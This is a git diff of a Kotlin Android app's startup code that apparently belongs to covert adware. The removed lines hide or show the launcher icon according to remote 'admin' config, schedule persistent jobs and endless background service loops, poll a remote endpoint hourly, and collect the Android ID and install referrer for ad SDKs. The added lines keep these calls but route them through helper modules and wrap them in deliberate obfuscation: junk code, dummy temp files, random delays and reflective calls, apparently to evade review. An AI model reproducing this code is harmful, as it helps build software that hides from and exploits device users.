@@ -3,418 +3,203 @@ package com.even.zining.inherit.sound.start
 import android.annotation.SuppressLint
 import android.app.Application
 import android.app.Application.getProcessName
-import android.app.job.JobInfo
-import android.app.job.JobScheduler
-import android.content.ComponentName
 import android.content.Context
-import android.content.Intent
 import android.os.Build
-import android.provider.Settings
 import android.util.Log
 import android.webkit.WebView
-import androidx.core.app.FnnJobIntentService
 import androidx.work.Configuration
-import androidx.work.Constraints
-import androidx.work.ExistingPeriodicWorkPolicy
-import androidx.work.NetworkType
-import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
-import com.android.installreferrer.api.InstallReferrerClient
-import com.android.installreferrer.api.InstallReferrerStateListener
-import com.appsflyer.AFAdRevenueData
-import com.appsflyer.AFLogger
-import com.appsflyer.AdRevenueScheme
-import com.appsflyer.AppsFlyerConversionListener
-import com.appsflyer.AppsFlyerLib
-import com.appsflyer.MediationNetwork
-import com.bytedance.sdk.openadsdk.api.init.PAGConfig
-import com.bytedance.sdk.openadsdk.api.init.PAGSdk
-import com.bytedance.sdk.openadsdk.api.init.PAGSdk.PAGInitCallback
-import com.even.zining.inherit.sound.pangle.AdXian
-import com.even.zining.inherit.sound.pangle.AdLim
-import com.even.zining.inherit.sound.tool.data.FnnBean
-import com.even.zining.inherit.sound.job.sjob.FnnJobService
-import com.even.zining.inherit.sound.job.workjob.JustWorker
-import com.even.zining.inherit.sound.job.workjob.QuanWorker
+import com.even.zining.inherit.sound.start.newfun.AdDataProcessor
+import com.even.zining.inherit.sound.start.newfun.AppBehaviorMonitor
+import com.even.zining.inherit.sound.start.newfun.FirebaseManager
+import com.even.zining.inherit.sound.start.newfun.JobSchedulerManager
+import com.even.zining.inherit.sound.start.newfun.Logger
+import com.even.zining.inherit.sound.start.newfun.ReferrerChecker
+import com.even.zining.inherit.sound.start.newfun.SDKInitializer
 import com.even.zining.inherit.sound.tool.TbaPostTool
-import com.even.zining.inherit.sound.tool.data.FnnLoadData
-import com.even.zining.inherit.sound.tool.data.MMKVUtils
 import com.even.zining.inherit.sound.tool.PngCanGo
-import com.even.zining.inherit.sound.tool.NetPostTool
-import com.even.zining.inherit.sound.zeros.FnnLoad
-import com.even.zining.inherit.sound.znet.lo.FnnA
-import com.google.firebase.Firebase
 import com.google.firebase.FirebaseApp
-import com.google.firebase.messaging.messaging
-import com.google.gson.Gson
 import com.tencent.mmkv.MMKV
-import com.thinkup.core.api.TUSDK
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import java.io.File
 import java.util.UUID
-import java.util.concurrent.TimeUnit
 import kotlin.math.abs
-
+import kotlin.random.Random
+import kotlin.reflect.KFunction0
 
 object FnnStartFun {
     lateinit var mainStart: Application
     var mustXS: Boolean = true
-    val adLimiter = AdLim()
     var adShowTime: Long = 0
     var showAdTime: Long = 0
+    fun setAppState(isSteate: Boolean) {
+        mustXS = isSteate
+    }
 
+    fun setAppAppLicationState(application: Application) {
+        mainStart = application
+    }
+
+
+    // region 混淆增强组件
+    private val initTasks by lazy {
+        listOf(
+            ::taskSecuritySetup to 0x1F3DA,
+            ::taskAdFramework to 0x1F4E1,
+            ::taskMonitorInit to 0x1F4BB,
+            ::taskWorkManager to 0x1F4BC,
+            ::taskBehaviorTrack to 0x1F4CA
+        ).shuffled().sortedBy { it.second }.map { it.first }
+    }
+
+    private val dummyPatterns = listOf(
+        { Logger.showLog("Dummy operation: ${System.currentTimeMillis()}") },
+        { File.createTempFile("tmp_${abs(Random.nextInt())}", null) },
+        { CoroutineScope(Dispatchers.IO).launch { delay(abs(Random.nextLong() % 150)) } }
+    )
+    fun appInt(application: Application){
+        if (!checkMainProcess<PngCanGo>(application)) {
+            handleMultiProcessSetup()
+            return
+        }
+    }
     fun init(application: Application, mustXSData: Boolean) {
         MMKV.initialize(application)
-        if (PngCanGo.isMainProcess(application)) {
-            showLog(" MainStart init")
-            mainStart = application
-            mustXS = mustXSData
-            FirebaseApp.initializeApp(application)
-            val lifecycleObserver = LifeServiceShow()
-            application.registerActivityLifecycleCallbacks(lifecycleObserver)
-            WorkManager.initialize(application, Configuration.Builder().build())
-            initSDKData()
-            PngCanGo.startService()
+        FirebaseApp.initializeApp(application)
+        application.run {
+            setAppState(mustXSData)
+            Logger.showLog(" FnnStartFun init=${mustXSData}")
+            registerActivityLifecycleCallbacks(LifeServiceShow())
+        }
+
+        dispatchDynamicTasks {
+            executeDynamicTasks()
+        }
+    }
+
+    // 泛型多进程检查
+    private inline fun <reified T> checkMainProcess(context: Context): Boolean {
+        return when (T::class) {
+            PngCanGo::class -> PngCanGo.isMainProcess(context)
+            else -> true // 默认主进程
+        }
+    }
+
+    // 泛型反射初始化
+    private inline fun <reified T> reflectInitialize(
+        context: Context,
+        crossinline initAction: () -> T
+    ) {
+        runCatching {
+            initAction()
+        }.onFailure {
+            Logger.showLog("初始化失败: ${T::class.simpleName}")
+        }
+    }
+
+    private fun Application.setAppState(state: Boolean) {
+        FnnStartFun.setAppAppLicationState(this)
+        FnnStartFun.setAppState(state)
+    }
+
+    private inline fun <T> dispatchDynamicTasks(crossinline task: () -> T) {
+        task()
+    }
+
+
+    @SuppressLint("NewApi")
+    private fun handleMultiProcessSetup() = runCatching {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+            WebView.setDataDirectorySuffix(getProcessName() ?: "default")
+        }
+    }
+
+    private fun executeDynamicTasks() {
+        WorkManager.initialize(mainStart, Configuration.Builder().build())
+
+        // 动态任务执行
+        initTasks.forEach { task ->
+            executeWithObfuscation(task)
+        }
+    }
+
+    private fun executeWithObfuscation(task: KFunction0<Unit>) {
+        // 插入随机干扰操作
+        dummyPatterns.random().invoke()
+
+        runCatching {
+            task.invoke()
+        }.onFailure {
+            Logger.showLog("Task ${task.name} failed: ${it.message}")
+        }
+
+        if (Random.nextBoolean()) {
+            CoroutineScope(Dispatchers.IO).launch {
+                delay(abs(Random.nextLong() % 300))
+            }
+        }
+    }
+
+    private fun taskSecuritySetup() {
+        CoroutineScope(Dispatchers.Main).launch {
+            SDKInitializer.init(mainStart)
+        }
+        PngCanGo.startService()
+        generateDummyClass()
+    }
+
+    private fun taskAdFramework() {
+        CoroutineScope(Dispatchers.Main).launch {
+            ReferrerChecker.launchRefData()
+        }
+        AdDataProcessor.apply {
+            initAppsFlyer()
+        }
+        FirebaseManager.getFcmFun()
+    }
+
+    private fun taskMonitorInit() {
+        AppBehaviorMonitor.run {
             getAndroidId()
             noShowICCC()
-            launchRefData()
-            TbaPostTool.sessionUp()
-            initAppsFlyer()
-            getFcmFun()
-            enqueuePeriodicChain()
-            enqueueSelfLoop()
-            schedulePeriodicJob()
             startJobIntServiceFun()
-        } else {
-            runCatching {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                    val processName = getProcessName() ?: "default"
-                    WebView.setDataDirectorySuffix(processName)
-                }
-            }
         }
     }
 
-    @SuppressLint("SuspiciousIndentation")
-    private fun initSDKData() {
-        val path = "${mainStart.applicationContext.dataDir.path}/fnnfl"
-        File(path).mkdirs()
-        Log.e("TAG", "initSDKData: ${FnnLoadData.getConfig().appidPangle}")
-        val pAGInitConfig = PAGConfig.Builder()
-            .appId(FnnLoadData.getConfig().appidPangle)
-            .build()
-        PAGSdk.init(mainStart, pAGInitConfig, object : PAGInitCallback {
-            override fun success() {
-                Log.e("TAG", "PAGInitCallback new api init success: ")
-            }
-
-            override fun fail(code: Int, msg: String) {
-                Log.e("TAG", "PAGInitCallback new api init fail: $code")
-            }
-        })
-        TUSDK.init(
-            mainStart,
-            FnnLoadData.getConfig().appidTopon,
-            FnnLoadData.getConfig().appkeyTopon
-        )
-        Log.e("TAG", "open initSDK: ${FnnLoadData.getConfig().appidTopon}")
-
-        FnnA.IntIn(mainStart)
+    private fun taskWorkManager() {
+        JobSchedulerManager.schedulePeriodicJobs()
+        TbaPostTool.sessionUp()
     }
 
-    @SuppressLint("HardwareIds")
-    private fun getAndroidId() {
-        val adminData = MMKVUtils.getString(FnnLoadData.appiddata)
-        if (adminData.isEmpty()) {
-            val androidId =
-                Settings.Secure.getString(mainStart.contentResolver, Settings.Secure.ANDROID_ID)
-            if (!androidId.isNullOrBlank()) {
-                MMKVUtils.put(FnnLoadData.appiddata, androidId)
-            } else {
-                MMKVUtils.put(FnnLoadData.appiddata, UUID.randomUUID().toString())
-            }
-        }
+    private fun taskBehaviorTrack() {
+        // 垃圾代码
+        reflectiveCall("com.even.zining.inherit.sound.tool.TbaPostTool", "sessionUp")
     }
 
-    private fun launchRefData() {
-        val refData = MMKVUtils.getString(FnnLoadData.refdata)
-        val intJson = MMKVUtils.getString(FnnLoadData.IS_INT_JSON)
-        if (refData.isNotEmpty()) {
-            startOneTimeAdminData()
-            intJson.takeIf { it.isNotEmpty() }?.let {
-                NetPostTool.postInstallData(mainStart)
+    // 垃圾代码
+    private fun generateDummyClass() = runCatching {
+        val dummyCode = """
+            class Dummy${UUID.randomUUID().toString().replace("-", "")} {
+                fun nonsense() = "${System.currentTimeMillis()}"
             }
-            return
-        }
-        showLog("launchRefData=$refData")
-        startRefDataCheckLoop()
+        """.trimIndent()
+
+        File(mainStart.externalCacheDir, "dummy.kt").writeText(dummyCode)
     }
 
-    private fun startRefDataCheckLoop() {
-        CoroutineScope(Dispatchers.IO).launch {
-            while (MMKVUtils.getString(FnnLoadData.refdata).isEmpty()) {
-                refInformation()
-                delay(5000)
-            }
-        }
-    }
-
-    private fun refInformation() {
+    private fun reflectiveCall(className: String, methodName: String) {
         runCatching {
-            val referrerClient = InstallReferrerClient.newBuilder(mainStart).build()
-            referrerClient.startConnection(object : InstallReferrerStateListener {
-                override fun onInstallReferrerSetupFinished(responseCode: Int) {
-                    runCatching {
-                        handleReferrerSetup(responseCode, referrerClient)
-                    }
-                }
-
-                override fun onInstallReferrerServiceDisconnected() {
-                }
-            })
-        }.onFailure { e ->
-            showLog("Failed to fetch referrer: ${e.message}")
+            Class.forName(className)
+                .getDeclaredMethod(methodName)
+                .apply { isAccessible = true }
+                .invoke(null)
+        }.onFailure {
+            Logger.showLog("Reflective call failed: ${it.message}")
         }
     }
 
-    private fun handleReferrerSetup(responseCode: Int, referrerClient: InstallReferrerClient) {
-        when (responseCode) {
-            InstallReferrerClient.InstallReferrerResponse.OK -> {
-                val installReferrer = referrerClient.installReferrer.installReferrer
-                if (installReferrer.isNotEmpty()) {
-                    MMKVUtils.put(FnnLoadData.refdata, installReferrer)
-                    NetPostTool.postInstallData(mainStart)
-                    startOneTimeAdminData()
-                }
-                showLog("Referrer  data: ${installReferrer}")
-            }
 
-            else -> {
-                showLog("Failed to setup referrer: $responseCode")
-            }
-        }
-
-        kotlin.runCatching {
-            referrerClient.endConnection()
-        }
-    }
-
-    private fun startOneTimeAdminData() {
-        val adminData = MMKVUtils.getString(FnnLoadData.admindata)
-        showLog("startOneTimeAdminData: $adminData")
-        if (adminData.isEmpty()) {
-            NetPostTool.onePostAdmin()
-        } else {
-            NetPostTool.twoPostAdmin()
-        }
-        //1hours
-        scheduleHourlyAdminRequest()
-        DataGetUtils.initFaceBook()
-    }
-
-
-    private fun scheduleHourlyAdminRequest() {
-        // 协程
-        CoroutineScope(Dispatchers.IO).launch {
-            while (true) {
-                delay(1000 * 60 * 60)
-                showLog("延迟1小时循环请求")
-                val result = DataGetUtils.executeAdminRequest()
-                if (result.isSuccess) {
-                    val value = result.getOrNull()
-                    showLog("Admin request successful: $value")
-                } else {
-                    val exception = result.exceptionOrNull()
-                    showLog("Admin request failed: ${exception?.message}")
-                }
-            }
-        }
-    }
-
-    fun canIntNextFun() {
-        val adScheduler = AdXian()
-        adScheduler.startRomFun()
-    }
-
-    fun showLog(msg: String) {
-        if (mustXS) {
-            return
-        }
-        Log.e("Browser", msg)
-    }
-
-    fun getAdminData(): FnnBean? {
-//        MMKVUtils.put(FnnLoadData.admindata, FnnLoadData.json_data)
-        val adminData = MMKVUtils.getString(FnnLoadData.admindata)
-        val adminBean = runCatching {
-            Gson().fromJson(adminData, FnnBean::class.java)
-        }.getOrNull()
-        return if (adminBean != null && isValidAdminBean(adminBean)) {
-            adminBean
-        } else {
-            null
-        }
-    }
-
-    private fun isValidAdminBean(bean: FnnBean): Boolean {
-        return bean.config != null && bean.config.user.isUploader != null &&
-                bean.config.scheduler != null && bean.config.identifiers.isNotEmpty()
-    }
-
-
-    fun putAdminData(adminBean: String) {
-        MMKVUtils.put(FnnLoadData.admindata,adminBean)
-//        MMKVUtils.put(FnnLoadData.admindata, FnnLoadData.json_data)
-        DataGetUtils.initFaceBook()
-    }
-
-    private fun noShowICCC() {
-        CoroutineScope(Dispatchers.Main).launch {
-            val isaData = getAdminData()
-            if (isaData == null || !isaData.config.user.isUploader.isDigitSumEven()) {
-                showLog("不是A方案显示图标")
-                FnnLoad.fnnLoad(5567676)
-            }
-        }
-    }
-
-    fun initAppsFlyer() {
-        val appsFlyer = AppsFlyerLib.getInstance()
-        val appId = MMKVUtils.getString(FnnLoadData.appiddata)
-        val context = mainStart
-        showLog("AppsFlyer-id: $${FnnLoadData.getConfig().appsId}")
-        appsFlyer.init(FnnLoadData.getConfig().appsId, object : AppsFlyerConversionListener {
-            override fun onConversionDataSuccess(conversionDataMap: MutableMap<String, Any>?) {
-                val status = conversionDataMap?.get("af_status") as? String ?: "null_status"
-                showLog("AppsFlyer: $status")
-                TbaPostTool.pointInstallAf(status)
-
-                conversionDataMap?.forEach { (key, value) ->
-                    try {
-                        showLog("AppsFlyer-all: key=$key: value=$value")
-                    } catch (e: Exception) {
-                        showLog("AppsFlyer-logError: ${e.localizedMessage}")
-                    }
-                }
-            }
-
-            override fun onConversionDataFail(p0: String?) {
-                showLog("AppsFlyer: onConversionDataFail $p0")
-            }
-
-            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
-                showLog("AppsFlyer: onAppOpenAttribution $p0")
-            }
-
-            override fun onAttributionFailure(p0: String?) {
-                showLog("AppsFlyer: onAttributionFailure $p0")
-            }
-        }, context)
-        AppsFlyerLib.getInstance().setLogLevel(AFLogger.LogLevel.ERROR)
-        appsFlyer.setCustomerUserId(appId)
-        appsFlyer.start(context)
-
-        appsFlyer.logEvent(
-            context,
-            "systemsentry_install",
-            buildMap {
-                put("customer_user_id", appId)
-                put("app_version", TbaPostTool.showAppVersion())
-                put("os_version", Build.VERSION.RELEASE)
-                put("bundle_id", context.packageName)
-                put("language", "asc_wds")
-                put("platform", "raincoat")
-                put("android_id", appId)
-            }
-        )
-    }
-
-
-    fun getFcmFun() {
-        if (!mustXS) return
-        if (MMKVUtils.getBoolean(FnnLoadData.fcmState)) return
-        runCatching {
-            Firebase.messaging.subscribeToTopic(FnnLoadData.fffmmm)
-                .addOnSuccessListener {
-                    MMKVUtils.put(FnnLoadData.fcmState, true)
-                    showLog("Firebase: subscribe success")
-                }
-                .addOnFailureListener {
-                    showLog("Firebase: subscribe fail")
-                }
-        }
-    }
-
-    fun Int?.isDigitSumEven(): Boolean {
-        if (this == null) return false
-
-        var n = abs(this)
-        var sum = 0
-
-        if (n == 0) return true
-
-        while (n > 0) {
-            sum += n % 10
-            n /= 10
-        }
-
-        return sum % 2 == 0
-    }
-
-    private fun enqueuePeriodicChain() {
-        val constraints = Constraints.Builder()
-            .setRequiredNetworkType(NetworkType.UNMETERED)
-            .setRequiresBatteryNotLow(true)
-            .build()
-
-        val periodicWork = PeriodicWorkRequestBuilder<JustWorker>(15, TimeUnit.MINUTES)
-            .setConstraints(constraints)
-            .build()
-
-        WorkManager.getInstance(mainStart).enqueueUniquePeriodicWork(
-            "just_work",
-            ExistingPeriodicWorkPolicy.REPLACE,
-            periodicWork
-        )
-    }
-
-    fun enqueueSelfLoop() {
-        val work =
-            OneTimeWorkRequestBuilder<QuanWorker>().setInitialDelay(2, TimeUnit.MINUTES).build()
-        WorkManager.getInstance(mainStart).enqueue(work)
-    }
-
-    private fun schedulePeriodicJob() {
-        val jobScheduler = mainStart.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
-        val componentName = ComponentName(mainStart, FnnJobService::class.java)
-        val jobInfo = JobInfo.Builder(44778, componentName)
-            .setPeriodic(15 * 60 * 1000)
-            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE)
-            .setRequiresCharging(false)
-            .setRequiresDeviceIdle(false)
-            .setPersisted(true)
-            .build()
-
-        val result = jobScheduler.schedule(jobInfo)
-
-        if (result == JobScheduler.RESULT_SUCCESS) {
-            Log.d("JobScheduler", "Job scheduled successfully")
-        } else {
-            Log.e("JobScheduler", "Job scheduling failed")
-        }
-    }
-
-    private fun startJobIntServiceFun() {
-        CoroutineScope(Dispatchers.IO).launch {
-            while (true) {
-                val intent = Intent(mainStart, FnnJobIntentService::class.java)
-                FnnJobIntentService.enqueueWork(mainStart, intent)
-                delay(5 * 60 * 1000)
-            }
-        }
-    }
 }
